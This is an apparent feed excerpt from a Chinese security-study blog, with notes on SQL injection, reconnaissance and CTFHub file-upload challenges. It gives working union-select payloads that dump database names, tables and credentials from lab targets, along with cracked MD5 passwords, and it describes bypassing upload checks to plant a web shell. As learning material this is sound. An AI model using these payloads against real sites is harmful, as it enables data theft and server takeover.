    <summary type="html">&lt;h1 id=&quot;常见数据库类型&quot;&gt;&lt;a href=&quot;#常见数据库类型&quot; class=&quot;headerlink&quot; title=&quot;常见数据库类型&quot;&gt;&lt;/a&gt;常见数据库类型&lt;/h1&gt;&lt;p&gt;Access,mssql,mongoDB,postgresql,oracle,sybase等&lt;/p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_类型及提交注入</title>
    <link href="https://guuuuq.github.io/posts/ae7615fc.html"/>
    <id>https://guuuuq.github.io/posts/ae7615fc.html</id>
    <published>2022-12-10T17:29:26.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h1><p>数字，字符，搜索，JSON等</p><p>根据网站自身的参数，判断注入时是否需要考虑符号问题</p><p>如果参数为数字可能没有单引号，如果是字符很有可能有引号</p><p>其中SQL语句干扰符号：<code>&#39;</code>,<code>&#39;&#39;</code>,<code>%</code>,),等，具体需要看写法</p><p>例：</p><p>?x=Guuuuq<br>select * from user where name like ‘%Guuuuq%’</p><p>百分号的作用是前后带有Guuuuq的都是搜索的目标</p><p>需要在注入时考虑过滤干扰符号</p><h1 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h1><p>GET，POST，COOKIE，REQUEST，HTTP头等</p><p>参数数据过大时往往需要POST传参</p><p>按照出现漏洞的请求方式进行注入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简要明确参数类型&quot;&gt;&lt;a href=&quot;#简要明确参数类型&quot; class=&quot;headerlink&quot; title=&quot;简要明确参数类型&quot;&gt;&lt;/a&gt;简要明确参数类型&lt;/h1&gt;&lt;p&gt;数字，字符，搜索，JSON等&lt;/p&gt;
&lt;p&gt;根据网站自身的参数，判断注入时是否需要考虑符号问</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_MYSQL注入</title>
    <link href="https://guuuuq.github.io/posts/7efa6085.html"/>
    <id>https://guuuuq.github.io/posts/7efa6085.html</id>
    <published>2022-12-08T14:40:54.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071619338.png" alt=""></p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081605945.png" alt=""></p><h1 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h1><h2 id="跨库查询及应用思路"><a href="#跨库查询及应用思路" class="headerlink" title="跨库查询及应用思路"></a>跨库查询及应用思路</h2><h3 id="查询所有的数据库"><a href="#查询所有的数据库" class="headerlink" title="查询所有的数据库"></a>查询所有的数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081632344.png" alt=""></p><h3 id="获取test数据库下的表名信息"><a href="#获取test数据库下的表名信息" class="headerlink" title="获取test数据库下的表名信息"></a>获取test数据库下的表名信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;test&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081644786.png" alt=""></p><h3 id="获取test数据库users表名下的列名信息"><a href="#获取test数据库users表名下的列名信息" class="headerlink" title="获取test数据库users表名下的列名信息"></a>获取test数据库users表名下的列名信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema= &#x27;test&#x27; and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081647086.png" alt=""></p><p>不仅要指定表名，还需要指定数据库名,否则会查到所有users表名下的信息，如图</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081648688.png" alt=""></p><h3 id="获取test下的users的username的数据"><a href="#获取test下的users的username的数据" class="headerlink" title="获取test下的users的username的数据"></a>获取test下的users的username的数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),3 from test.users</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212081651453.png" alt=""></p><h1 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h1><p>load_file():读取函数</p><p>into outfile或into dumpfile:导出函数</p><h2 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h2><p>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</p><h2 id="常见写入文件问题：魔术引导开关"><a href="#常见写入文件问题：魔术引导开关" class="headerlink" title="常见写入文件问题：魔术引导开关"></a>常见写入文件问题：魔术引导开关</h2><p>magic_quotes_gpc</p><p>在一个项目中，魔术引号若是打开的话，所有的反斜线（\）、单引号（’）、双引号（”）、NULL 字符都会被自动加上一个反斜线进行转义</p><p>绕过方法：</p><ul><li>16进制编码</li></ul><p>addslashes()函数效果类似magic_quotes_gpc</p><h2 id="相关防注入"><a href="#相关防注入" class="headerlink" title="相关防注入"></a>相关防注入</h2><ul><li>自带防御：魔术引号</li></ul><p>使用magic_quote_gpc</p><ul><li>内置函数</li></ul><p>使用is_int()内置函数</p><p>参数需要为整数，不然执行else后的语句</p><ul><li>自定义关键字</li></ul><p>使用str_replace()进行过滤关键字</p><p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）</p><p>可以尝试进行大小写绕过</p><ul><li>WAF防护软件：安全狗，宝塔等</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071619338.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/G</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_SQL注入之简要SQL注入</title>
    <link href="https://guuuuq.github.io/posts/f2647ba1.html"/>
    <id>https://guuuuq.github.io/posts/f2647ba1.html</id>
    <published>2022-12-07T15:50:58.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071552890.png" alt=""></p><h1 id="SQL注入安全测试中危害"><a href="#SQL注入安全测试中危害" class="headerlink" title="SQL注入安全测试中危害"></a>SQL注入安全测试中危害</h1><ul><li><p>大部分是危害数据库中的数据，能够操作数据</p></li><li><p>直接危害网站的权限（需要满足一定条件）</p></li></ul><h1 id="SQL注入产生原理详细分析"><a href="#SQL注入产生原理详细分析" class="headerlink" title="SQL注入产生原理详细分析"></a>SQL注入产生原理详细分析</h1><ul><li>原理：通过参数传递将恶意SQL语句拼接到源代码的SQL语句中，实现自定义的攻击方式</li><li>条件：变量可控、能带入数据库查询、变量未存在过滤和过滤不严谨</li></ul><h1 id="搭建一个SQL注入学习靶场环境"><a href="#搭建一个SQL注入学习靶场环境" class="headerlink" title="搭建一个SQL注入学习靶场环境"></a>搭建一个SQL注入学习靶场环境</h1><p>略</p><hr><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071619338.png" alt=""></p><h1 id="如何判断注入点"><a href="#如何判断注入点" class="headerlink" title="如何判断注入点"></a>如何判断注入点</h1><ul><li>老办法<br>and 1=1 页面正常<br>and 1=2 页面错误<br>可能存在注入点</li></ul><h2 id="要选用最舒服的方法测试是否存在注入点"><a href="#要选用最舒服的方法测试是否存在注入点" class="headerlink" title="要选用最舒服的方法测试是否存在注入点"></a>要选用最舒服的方法测试是否存在注入点</h2><p><code>SELECT * FROM users WHERE id=1dadad(随便输入) LIMIT 0,1</code></p><p>可能出现三种情况</p><ul><li>对网页有影响，说明带入数据库进行查询有注入点</li><li>对网页没有影响，说明没有带入数据库查询，说明对应的参数没有漏洞</li><li>网站出现404错误/自动跳转到其他页面，这个时候说明网站对输入的东西有检测，出现这种情况，基本不存在SQL注入漏洞</li></ul><h1 id="必要知识点（SQL注入）"><a href="#必要知识点（SQL注入）" class="headerlink" title="必要知识点（SQL注入）"></a>必要知识点（SQL注入）</h1><ul><li><p>在MYSQL5.0以上版本中，MYSQL存在一个自带数据库名为information_schema，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或者列名信息</p></li><li><p>数据库中符号”.”代表下一级，如xiaodi.user表示xiaodi数据库下的user表名</p><hr></li></ul><ul><li><p>information_schema.tables：记录所有表名信息的表</p></li><li><p>information_schema.columns：记录所有列名信息的表</p></li><li><p>table_name：表名</p></li><li><p>column_name：列名</p></li><li><p>table_schema：数据库名</p></li></ul><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h3><h3 id="猜解列名数量-字段数"><a href="#猜解列名数量-字段数" class="headerlink" title="猜解列名数量(字段数)"></a>猜解列名数量(字段数)</h3><h3 id="order-by-x-数字）-正常与错误的正常值"><a href="#order-by-x-数字）-正常与错误的正常值" class="headerlink" title="order by x(数字） 正常与错误的正常值"></a>order by x(数字） 正常与错误的正常值</h3><p>正确的话网页正常显示，错误的话网页报错</p><h3 id="报错猜解准备"><a href="#报错猜解准备" class="headerlink" title="报错猜解准备"></a>报错猜解准备</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=1 union select 1,2,3,4</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li><p>数据库版本：version()<br>5.7.22-0ubuntu0.16.04.1</p></li><li><p>数据库名字：database()<br>mozhe_Discuz_StormGroup</p></li><li><p>数据库用户：user()<br>root@localhost</p></li><li><p>操作系统：@@version_compile_os<br>Linux</p></li></ul><h3 id="查询指定数据库名"><a href="#查询指定数据库名" class="headerlink" title="查询指定数据库名"></a>查询指定数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’</span><br></pre></td></tr></table></figure><h3 id="查询所有表名"><a href="#查询所有表名" class="headerlink" title="查询所有表名"></a>查询所有表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=‘mozhe_Discuz_StormGroup’</span><br></pre></td></tr></table></figure><h3 id="查询指定表名的全部列名"><a href="#查询指定表名的全部列名" class="headerlink" title="查询指定表名的全部列名"></a>查询指定表名的全部列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=‘StormGroup_member’</span><br></pre></td></tr></table></figure><h3 id="查询指定数据"><a href="#查询指定数据" class="headerlink" title="查询指定数据"></a>查询指定数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member</span><br></pre></td></tr></table></figure><h3 id="猜解多个数据-通过limit-x-1-变动猜解"><a href="#猜解多个数据-通过limit-x-1-变动猜解" class="headerlink" title="猜解多个数据(通过limit x,1 变动猜解)"></a>猜解多个数据(通过limit x,1 变动猜解)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 0,1</span><br><span class="line"></span><br><span class="line">356f589a7df439f6f744ff19bb8092c0 MD5 解密 dsan13</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:49521/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</span><br><span class="line"></span><br><span class="line">31cc73aa7893cef0045188565f38b1123 MD5解密240206</span><br></pre></td></tr></table></figure><p>这里第一个账号密码被禁用，我们可以通过limit的方式查看其他密码 / 在账号相同的情况下，我们也可以用group_concat函数查看全部的密码,最后通过得到的账号密码就可以得到key</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212071552890.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;SQL注入安全测试中危害&quot;&gt;&lt;a href=&quot;#SQL注入安全测试中危</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞_必懂知识点</title>
    <link href="https://guuuuq.github.io/posts/825ab969.html"/>
    <id>https://guuuuq.github.io/posts/825ab969.html</id>
    <published>2022-12-05T16:08:36.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212051613953.png" alt=""></p><h1 id="漏洞危害情况"><a href="#漏洞危害情况" class="headerlink" title="漏洞危害情况"></a>漏洞危害情况</h1><p>SQL注入是关于网站对应数据库的权限，这个漏洞能够获取网站服务器的数据。</p><p>文件上传可能直接拿到网站权限</p><p>XSS围绕管理员的cookie可以获取网站的权限，不能获取服务器的权限</p><p>每种漏洞的危害情况是不同的</p><h1 id="漏洞等级划分"><a href="#漏洞等级划分" class="headerlink" title="漏洞等级划分"></a>漏洞等级划分</h1><ul><li><p>高危漏洞：SQL注入、文件上传、文件包含、代码执行、未授权访问、命令执行</p><p>影响：直接影响到网站权限和数据库权限，能够获取数据或者网站的敏感文件。涉及到数据安全和权限的丢失都为高危漏洞</p></li><li><p>中危漏洞：反序列化、逻辑安全</p></li><li><p>低危漏洞：XSS跨站、目录遍历、文件读取</p><p>影响：网站的源码，网站部分账号密码</p></li></ul><h1 id="漏洞重点内容"><a href="#漏洞重点内容" class="headerlink" title="漏洞重点内容"></a>漏洞重点内容</h1><p>CTF：SQL注入、文件上传、反序列化（经常考）、代码执行</p><p>SRC：图片上漏洞都能出现，逻辑安全出现比较多</p><p>红蓝对抗：涉及的高危漏洞，文件上传、文件包含、代码执行、命令执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212051613953.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;漏洞危害情况&quot;&gt;&lt;a href=&quot;#漏洞危害情况&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集_资产监控拓展</title>
    <link href="https://guuuuq.github.io/posts/bdc0c442.html"/>
    <id>https://guuuuq.github.io/posts/bdc0c442.html</id>
    <published>2022-12-04T14:31:32.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h1><p>便于收集整理最新exp或poc</p><p>便于发现相关测试目标的资产</p><p>如何使用（为什么用这个技术？一是官方的ctms是需要收费的，我们可以通过监控github来找到类似的<a href="https://so.csdn.net/so/search?q=源码&amp;spm=1001.2101.3001.7020">源码</a>，二是在github官网上有着最新的检测漏洞报告）</p><h1 id="黑暗引擎实现域名端口收集"><a href="#黑暗引擎实现域名端口收集" class="headerlink" title="黑暗引擎实现域名端口收集"></a>黑暗引擎实现域名端口收集</h1><p><a href="https://fofa.info/">https://fofa.info/</a></p><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><h1 id="全自动域名收集枚举优秀脚本使用"><a href="#全自动域名收集枚举优秀脚本使用" class="headerlink" title="全自动域名收集枚举优秀脚本使用"></a>全自动域名收集枚举优秀脚本使用</h1><p><a href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a></p><p>layer子域名挖掘机（csdn上搜索即可）</p><h1 id="SRC目标中的信息收集全覆盖"><a href="#SRC目标中的信息收集全覆盖" class="headerlink" title="SRC目标中的信息收集全覆盖"></a>SRC目标中的信息收集全覆盖</h1><p>补天平台专属SRC</p><h1 id="利用其他第三方接口获取更多信息"><a href="#利用其他第三方接口获取更多信息" class="headerlink" title="利用其他第三方接口获取更多信息"></a>利用其他第三方接口获取更多信息</h1><p>全球CDN服务商查询 <a href="http://tools.ipip.net/cdn.php">http://tools.ipip.net/cdn.php</a> </p><p>利用国外IP去PING网站，可能绕过CDN服务</p><p>全球DNS解析服务查询 <a href="https://securitytrails.com/domain/`www.baidu.com`/history/a">https://securitytrails.com/domain/`www.baidu.com`/history/a</a></p><p>更改其中的域名即可查询DNS解析历史</p><p>查询网站证书<a href="https://crt.sh/">https://crt.sh/</a></p><p>IP地址高精度查询</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Github监控&quot;&gt;&lt;a href=&quot;#Github监控&quot; class=&quot;headerlink&quot; title=&quot;Github监控&quot;&gt;&lt;/a&gt;Github监控&lt;/h1&gt;&lt;p&gt;便于收集整理最新exp或poc&lt;/p&gt;
&lt;p&gt;便于发现相关测试目标的资产&lt;/p&gt;
&lt;p&gt;如何</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集_APP及其他资产</title>
    <link href="https://guuuuq.github.io/posts/3aa11996.html"/>
    <id>https://guuuuq.github.io/posts/3aa11996.html</id>
    <published>2022-12-03T15:43:40.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="APP提取及抓包及后续配合"><a href="#APP提取及抓包及后续配合" class="headerlink" title="APP提取及抓包及后续配合"></a>APP提取及抓包及后续配合</h1><h2 id="某apk一件提取反编译"><a href="#某apk一件提取反编译" class="headerlink" title="某apk一件提取反编译"></a>某apk一件提取反编译</h2><p>例：<a href="https://github.com/TheKingOfDuck/ApkAnalyser">https://github.com/TheKingOfDuck/ApkAnalyser</a> 使用反编译软件提取安卓应用中可能存在的敏感信息</p><p>还有：<a href="https://github.com/liaojack8/AndroidKiller">https://github.com/liaojack8/AndroidKiller</a> Android Killer 功能同上</p><h2 id="利用BurpSuite抓包获取更多URL"><a href="#利用BurpSuite抓包获取更多URL" class="headerlink" title="利用BurpSuite抓包获取更多URL"></a>利用BurpSuite抓包获取更多URL</h2><p>在模拟器中设置网络端口，在BurpSuite中设置监听IP地址，在app中多次点击不同界面尽量获取更多的URL为渗透提供更多的目标和可能。</p><h1 id="某IP无WEB框架下的第三方测试"><a href="#某IP无WEB框架下的第三方测试" class="headerlink" title="某IP无WEB框架下的第三方测试"></a>某IP无WEB框架下的第三方测试</h1><h2 id="各种端口一顿乱扫"><a href="#各种端口一顿乱扫" class="headerlink" title="各种端口一顿乱扫"></a>各种端口一顿乱扫</h2><p>使用Nmap等工具扫描目的网站端口</p><p>谷歌引擎搜索</p><p>黑暗引擎搜索 shodan zoomeye fofa</p><h2 id="各种借口一顿乱扫"><a href="#各种借口一顿乱扫" class="headerlink" title="各种借口一顿乱扫"></a>各种借口一顿乱扫</h2><h2 id="接口部分一顿测试"><a href="#接口部分一顿测试" class="headerlink" title="接口部分一顿测试"></a>接口部分一顿测试</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;APP提取及抓包及后续配合&quot;&gt;&lt;a href=&quot;#APP提取及抓包及后续配合&quot; class=&quot;headerlink&quot; title=&quot;APP提取及抓包及后续配合&quot;&gt;&lt;/a&gt;APP提取及抓包及后续配合&lt;/h1&gt;&lt;h2 id=&quot;某apk一件提取反编译&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集_架构，搭建，WAF等</title>
    <link href="https://guuuuq.github.io/posts/e0179121.html"/>
    <id>https://guuuuq.github.io/posts/e0179121.html</id>
    <published>2022-12-02T15:44:21.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<p>渗透测试的思路就是从信息收集开始的</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212021942505.png" alt=""></p><h1 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h1><h2 id="目录型站点"><a href="#目录型站点" class="headerlink" title="目录型站点"></a>目录型站点</h2><p>例：sti.blcu.edu.cn和sti.blcu.cn/bbs（网站好像已经没有了）</p><p>主站的网站目录下可能有不同的源码搭建的网站，这样就造成一个网站有多套网站源码可以利用，进攻渗透由单个目标转为多个目标，漏洞出现的可能性提高。</p><h2 id="端口型站点"><a href="#端口型站点" class="headerlink" title="端口型站点"></a>端口型站点</h2><p>例：web.0516jz.com和web.0516jz.com:8080（网站好像已经没有了）</p><p>类似目录型站点，不过是用端口进行分隔，归根结底仍在同一台服务器上。</p><h2 id="子域名型站点"><a href="#子域名型站点" class="headerlink" title="子域名型站点"></a>子域名型站点</h2><p>例：<a href="http://www.goodlift.net/和http://bbs.goodlift.net/子域名两套CMS">http://www.goodlift.net/和http://bbs.goodlift.net/子域名两套CMS</a></p><p>域名解析可能在同一IP地址上，也可能不在同一IP地址上，如果在同一IP地址上则在同一服务器上，此时就类似目录型和端口型站点。（利用PING命令可以进行判断&lt;适用于没有CDN的情况&gt;）如果不在同一服务器又分为在同一网段（涉及到内网安全知识），不同网段就只能分开分析（考虑相同的数据和敏感信息）。</p><h2 id="类似域名型站点"><a href="#类似域名型站点" class="headerlink" title="类似域名型站点"></a>类似域名型站点</h2><p>例：<a href="http://www.jmlsd.com和http://www.jmlsd.cn">http://www.jmlsd.com和http://www.jmlsd.cn</a>  www.axgc168.com和www.jmlsd.com网站界面完全相同（但是可能存在不同漏洞）</p><p>网站经常换域名，特别是违法网站，正规网站也有换域名的时候</p><p>尝试更改域名后缀或者脚本工具批量访问</p><h2 id="旁注，c段站点"><a href="#旁注，c段站点" class="headerlink" title="旁注，c段站点"></a>旁注，c段站点</h2><p>旁注：同服务器不同站点，其中之一为目标网站</p><p>c段：同网段不同服务器不同站点</p><h2 id="搭建软件特征站点"><a href="#搭建软件特征站点" class="headerlink" title="搭建软件特征站点"></a>搭建软件特征站点</h2><p>直接使用别人完成的一体化搭建软件、</p><p>抓包中的<code>Server</code>可以判断</p><p>搭建软件可能有固定存在的文件或者漏洞，例如phpstudy中的phpmyadmin</p><h1 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h1><h2 id="什么是WAF应用？"><a href="#什么是WAF应用？" class="headerlink" title="什么是WAF应用？"></a>什么是WAF应用？</h2><p>Web应用防护系统，Web应用<a href="https://baike.baidu.com/item/防火墙?fromModule=lemma_inlink">防火墙</a>是通过执行一系列针对HTTP/HTTPS的<a href="https://baike.baidu.com/item/安全策略/2890163?fromModule=lemma_inlink">安全策略</a>来专门为<a href="https://baike.baidu.com/item/Web/150564?fromModule=lemma_inlink">Web</a>应用提供保护的一款产品，分为软件和硬件形式。</p><h2 id="如何快速识别WAF？"><a href="#如何快速识别WAF？" class="headerlink" title="如何快速识别WAF？"></a>如何快速识别WAF？</h2><p>利用工具：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>手工判断：抓包数据中如果有<code>X-Powered-By：WAF/x.x</code>可能会存在WAF防护</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;渗透测试的思路就是从信息收集开始的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202212021942505.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;站点搭建分析&quot;&gt;&lt;a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_文件上传_00截断</title>
    <link href="https://guuuuq.github.io/posts/2a14d116.html"/>
    <id>https://guuuuq.github.io/posts/2a14d116.html</id>
    <published>2022-10-28T16:45:20.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是00截断"><a href="#什么是00截断" class="headerlink" title="什么是00截断"></a>什么是00截断</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。</p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>1.php版本小于5.3.29<br>2.magic_quotes_gpc = Off</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>用burpsuite抓包上传包含一句话木马的png文件</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281652262.png" alt=""></p><p>修改road的参数，在/upload/后添加<code>shell.php%00</code>，用”%00”截断，让语句强行结束，相当于上传一个”shell.php”的文件</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281657135.png" alt=""></p><p>提示上传成功，用蚁剑连接即可拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是00截断&quot;&gt;&lt;a href=&quot;#什么是00截断&quot; class=&quot;headerlink&quot; title=&quot;什么是00截断&quot;&gt;&lt;/a&gt;什么是00截断&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHub_web_文件上传_MIME绕过</title>
    <link href="https://guuuuq.github.io/posts/aeef47b0.html"/>
    <id>https://guuuuq.github.io/posts/aeef47b0.html</id>
    <published>2022-10-28T15:56:46.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是MIME"><a href="#什么是MIME" class="headerlink" title="什么是MIME"></a>什么是MIME</h1><p>MIME(multipurpose Internet mail extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>burp抓包提交过程</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281616509.png" alt=""></p><p>“<strong>Connection_Type</strong>“为验证文件类型的语句将其参数改成<code>image/png</code>绕过检测，以成功上传php后缀的文件</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281627910.png" alt=""></p><p>上传成功，用蚁剑连接</p><p><img src="https://cdn.staticaly.com/gh/Guuuuq/image@main/img/202210281629422.png" alt=""></p><p>成功拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是MIME&quot;&gt;&lt;a href=&quot;#什么是MIME&quot; class=&quot;headerlink&quot; title=&quot;什么是MIME&quot;&gt;&lt;/a&gt;什么是MIME&lt;/h1&gt;&lt;p&gt;MIME(multipurpose Internet mail extensions)多用途互联网邮</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFHUB_web_命令注入综合过滤</title>
    <link href="https://guuuuq.github.io/posts/aba31e24.html"/>
    <id>https://guuuuq.github.io/posts/aba31e24.html</id>
    <published>2022-10-26T20:29:01.000Z</published>
    <updated>2023-04-02T08:36:35.381Z</updated>
    
